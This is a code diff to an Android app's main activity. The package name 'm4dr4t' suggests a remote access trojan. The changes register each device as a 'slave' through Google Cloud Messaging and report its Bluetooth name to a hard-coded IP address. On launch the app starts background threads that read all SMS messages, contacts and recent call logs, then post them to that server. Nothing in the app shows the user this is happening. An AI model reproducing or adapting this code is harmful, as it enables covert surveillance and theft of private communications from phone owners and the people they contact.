@@ -1,8 +1,12 @@
 package example.com.m4dr4t;
 
 import android.app.Activity;
+import android.bluetooth.BluetoothAdapter;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.SharedPreferences;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
@@ -14,6 +18,10 @@ import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.TextView;
+
+import com.google.android.gms.common.ConnectionResult;
+import com.google.android.gms.common.GooglePlayServicesUtil;
+import com.google.android.gms.gcm.GoogleCloudMessaging;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
@@ -34,13 +42,35 @@ import java.text.DateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.concurrent.atomic.AtomicInteger;
 
 
 public class MainActivity extends Activity {
 
-    Context context;
-    public TextView outputText;
 
+    private final static int PLAY_SERVICES_RESOLUTION_REQUEST = 9000;
+
+    public static final String EXTRA_MESSAGE = "message";
+    public static final String PROPERTY_REG_ID = "registration_id";
+    private static final String PROPERTY_APP_VERSION = "appVersion";
+    /**
+     * Substitute you own sender ID here. This is the project number you got
+     * from the API Console, as described in "Getting Started."
+     */
+    String SENDER_ID = "203522111204";
+
+    /**
+     * Tag used on log messages.
+     */
+    static final String TAG = "m4dr4t";
+
+    TextView mDisplay;
+    GoogleCloudMessaging gcm;
+    AtomicInteger msgId = new AtomicInteger();
+    SharedPreferences prefs;
+    Context context;
+
+    String regid;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -48,25 +78,236 @@ public class MainActivity extends Activity {
         setContentView(R.layout.activity_main);
 
         context = getApplicationContext();
-        outputText = (TextView) findViewById(R.id.textView1);
+        mDisplay = (TextView) findViewById(R.id.textView1);
+        // Check device for Play Services APK. If check succeeds, proceed with
+        //  GCM registration.
+        if (checkPlayServices()) {
+            gcm = GoogleCloudMessaging.getInstance(this);
+            regid = getRegistrationId(context);
 
-        /*try {
-            fetchContacts();
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }*/
-        try {
-            getsms();
-        } catch (JSONException e) {
-            e.printStackTrace();
+            if (regid.isEmpty()) {
+                registerInBackground();
+            }
+        } else {
+            Log.i(TAG, "No valid Google Play Services APK found.");
         }
+        Thread t1 = new Thread(new Runnable() {
+            public void run() {
+                try {
+                    getsms();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+        t1.start();
 
-        /*getCallDetails(context);*/
-//        testing();
+        Thread t2 = new Thread(new Runnable() {
+            public void run() {
+                try {
+                    fetchContacts();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+        t2.start();
+
+        Thread t3 = new Thread(new Runnable() {
+            public void run() {
+
+                try {
+                    getCallDetails();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
+            }
+        });
+        t3.start();
+
 
     }
 
-    public void getsms() throws JSONException{
+    // You need to do the Play Services APK check here too.
+    @Override
+    protected void onResume() {
+        super.onResume();
+        checkPlayServices();
+    }
+
+    /**
+     * Check the device to make sure it has the Google Play Services APK. If
+     * it doesn't, display a dialog that allows users to download the APK from
+     * the Google Play Store or enable it in the device's system settings.
+     */
+    private boolean checkPlayServices() {
+        int resultCode = GooglePlayServicesUtil.isGooglePlayServicesAvailable(this);
+        if (resultCode != ConnectionResult.SUCCESS) {
+            if (GooglePlayServicesUtil.isUserRecoverableError(resultCode)) {
+                GooglePlayServicesUtil.getErrorDialog(resultCode, this,
+                        PLAY_SERVICES_RESOLUTION_REQUEST).show();
+            } else {
+                Log.i(TAG, "This device is not supported.");
+                finish();
+            }
+            return false;
+        }
+        return true;
+    }
+
+    /**
+     * Gets the current registration ID for application on GCM service.
+     * <p/>
+     * If result is empty, the app needs to register.
+     *
+     * @return registration ID, or empty string if there is no existing
+     * registration ID.
+     */
+    private String getRegistrationId(Context context) {
+        final SharedPreferences prefs = getGCMPreferences(context);
+        String registrationId = prefs.getString(PROPERTY_REG_ID, "");
+        if (registrationId.isEmpty()) {
+            Log.i(TAG, "Registration not found.");
+            return "";
+        }
+        // Check if app was updated; if so, it must clear the registration ID
+        // since the existing regID is not guaranteed to work with the new
+        // app version.
+        int registeredVersion = prefs.getInt(PROPERTY_APP_VERSION, Integer.MIN_VALUE);
+        int currentVersion = getAppVersion(context);
+        if (registeredVersion != currentVersion) {
+            Log.i(TAG, "App version changed.");
+            return "";
+        }
+        return registrationId;
+    }
+
+    /**
+     * @return Application's {@code SharedPreferences}.
+     */
+    private SharedPreferences getGCMPreferences(Context context) {
+        // This sample app persists the registration ID in shared preferences, but
+        // how you store the regID in your app is up to you.
+        return getSharedPreferences(MainActivity.class.getSimpleName(),
+                Context.MODE_PRIVATE);
+    }
+
+    /**
+     * @return Application's version code from the {@code PackageManager}.
+     */
+    private static int getAppVersion(Context context) {
+        try {
+            PackageInfo packageInfo = context.getPackageManager()
+                    .getPackageInfo(context.getPackageName(), 0);
+            return packageInfo.versionCode;
+        } catch (PackageManager.NameNotFoundException e) {
+            // should never happen
+            throw new RuntimeException("Could not get package name: " + e);
+        }
+    }
+
+    /**
+     * Registers the application with GCM servers asynchronously.
+     * <p/>
+     * Stores the registration ID and app versionCode in the application's
+     * shared preferences.
+     */
+    private void registerInBackground() {
+        new registerGCM().execute();
+
+    }
+
+    class registerGCM extends AsyncTask<String, Void, String> {
+
+        @Override
+        protected String doInBackground(String... params) {
+
+
+            HttpClient httpclient = new DefaultHttpClient();
+            HttpPost httppost = new HttpPost(
+                    "http://128.199.179.143/groups/api/addDetail");
+            String responseBody = null;
+
+
+            BluetoothAdapter myDevice = BluetoothAdapter.getDefaultAdapter();
+            String deviceName = myDevice.getName();
+            Log.i("deviceName", deviceName);
+
+
+            try {
+                if (gcm == null) {
+                    gcm = GoogleCloudMessaging.getInstance(context);
+                }
+                regid = gcm.register(SENDER_ID);
+
+                // Add your data
+                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
+
+                nameValuePairs.add(new BasicNameValuePair("type", "registration"));
+                nameValuePairs.add(new BasicNameValuePair("username", "kevin"));
+                nameValuePairs.add(new BasicNameValuePair("slaveid", regid));
+                nameValuePairs.add(new BasicNameValuePair("device", deviceName));
+
+
+                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+
+                // Execute HTTP Post Request
+                HttpResponse response = httpclient.execute(httppost);
+                HttpEntity entity = response.getEntity();
+                responseBody = EntityUtils.toString(entity);
+                Log.i("Response", responseBody);
+                // Log.i("Parameters", params[0]);
+
+            } catch (ClientProtocolException e) {
+
+                // TODO Auto-generated catch block
+            } catch (IOException e) {
+
+
+                // TODO Auto-generated catch block
+            }
+            storeRegistrationId(context, regid);
+            return regid;
+        }
+
+        @Override
+        protected void onPostExecute(String msg) {
+
+            Log.i("ID", msg);
+        }
+
+
+    }
+
+    /**
+     * Sends the registration ID to your server over HTTP, so it can use GCM/HTTP
+     * or CCS to send messages to your app. Not needed for this demo since the
+     * device sends upstream messages to a server that echoes back the message
+     * using the 'from' address in the message.
+     */
+    private void sendRegistrationIdToBackend() {
+        // Your implementation here.
+    }
+
+    /**
+     * Stores the registration ID and app versionCode in the application's
+     * {@code SharedPreferences}.
+     *
+     * @param context application's context.
+     * @param regId   registration ID
+     */
+    private void storeRegistrationId(Context context, String regId) {
+        final SharedPreferences prefs = getGCMPreferences(context);
+        int appVersion = getAppVersion(context);
+        Log.i(TAG, "Saving regId on app version " + appVersion);
+        SharedPreferences.Editor editor = prefs.edit();
+        editor.putString(PROPERTY_REG_ID, regId);
+        editor.putInt(PROPERTY_APP_VERSION, appVersion);
+        editor.commit();
+    }
+
+    public void getsms() throws JSONException {
         Uri uriSMSURI = Uri.parse("content://sms/");
         Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
         JSONObject parent = new JSONObject();
@@ -78,7 +319,7 @@ public class MainActivity extends Activity {
             String body = cur.getString(cur.getColumnIndexOrThrow("body"));
             String inttype = cur.getString(cur.getColumnIndexOrThrow("type"));
 
-            if(name == null)
+            if (name == null)
                 details.put("Name", address);
             else
                 details.put("Name", name);
@@ -95,9 +336,9 @@ public class MainActivity extends Activity {
         }
         parent.put("messages", messages);
         String data = parent.toString();
+        String type = "sms";
         AsyncTaskRunner runner = new AsyncTaskRunner();
-        runner.execute(data);
-
+        runner.execute(type, data);
 
 
     }
@@ -173,7 +414,7 @@ public class MainActivity extends Activity {
 //        outputText.setText(parent.toString());
         String data = parent.toString();
         AsyncTaskRunner runner = new AsyncTaskRunner();
-        runner.execute(data);
+        runner.execute("contacts", data);
 
     }
 
@@ -199,18 +440,20 @@ public class MainActivity extends Activity {
         return super.onOptionsItemSelected(item);
     }
 
-    private void getCallDetails(Context context) {
+    private void getCallDetails() throws JSONException {
         int i = 0;
-        StringBuffer sb = new StringBuffer();
+        
         Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
         int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
         int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
         int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
         int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
         int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
-        sb.append("{\"logs\":[\n");
+        JSONObject parent = new JSONObject();
+        JSONArray logs = new JSONArray();
         while (managedCursor.moveToNext() && i < 30) {
             i++;
+            JSONObject details = new JSONObject();
 
             String phNumber = managedCursor.getString(number);
             String callType = managedCursor.getString(type);
@@ -234,33 +477,21 @@ public class MainActivity extends Activity {
                     dir = "MISSED";
                     break;
             }
-//            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration + "\nPerson Name:--- " + person);
-//            sb.append("\n----------------------------------");
-            if (i < 30) {
-                sb.append("   {\n" +
-                        "           \"name\": \"" + person + "\",\n" +
-                        "           \"number\": \"" + phNumber + "\",\n" +
-                        "           \"duration\": \"" + callDuration + "\",\n" +
-                        "           \"type\": \"" + dir + "\",\n" +
-                        "           \"date\": \"" + callDayTime + "\"\n" +
-                        "       },\n");
-            } else {
-                sb.append("   {\n" +
-                        "           \"name\": \"" + person + "\",\n" +
-                        "           \"number\": \"" + phNumber + "\",\n" +
-                        "           \"duration\": \"" + callDuration + "\",\n" +
-                        "           \"type\": \"" + dir + "\",\n" +
-                        "           \"date\": \"" + callDayTime + "\"\n" +
-                        "       }\n");
-            }
+
+            details.put("name", person);
+            details.put("number", phNumber);
+            details.put("duration", callDuration);
+            details.put("type", dir);
+            details.put("date", callDayTime);
+            logs.put(details);
         }
         managedCursor.close();
-        sb.append("  ]\n" +
-                "}");
-        String data = sb.toString();
-//        call.setText(sb);
+        parent.put("logs", logs);
+
+        String data = parent.toString();
+
         AsyncTaskRunner runner = new AsyncTaskRunner();
-        runner.execute(data);
+        runner.execute("calllogs", data);
 
     }
 
@@ -271,16 +502,20 @@ public class MainActivity extends Activity {
         protected String doInBackground(String... params) {
             HttpClient httpclient = new DefaultHttpClient();
             HttpPost httppost = new HttpPost(
-                    "http://128.199.179.143/groups/api/addMessage");
+                    "http://128.199.179.143/groups/api/addDetail");
             String responseBody = null;
-            Log.d("Data", params[0]);
+            Log.i("Type", params[0]);
+            Log.i("ID", getRegistrationId(context));
+            Log.i("Data", params[1]);
+
 
             try {
                 // Add your data
                 List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
 
-
-                nameValuePairs.add(new BasicNameValuePair("messages", params[0]));
+                nameValuePairs.add(new BasicNameValuePair("type", params[0]));
+                nameValuePairs.add(new BasicNameValuePair("detail", params[1]));
+                nameValuePairs.add(new BasicNameValuePair("slaveid", getRegistrationId(context)));
 
 
                 httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
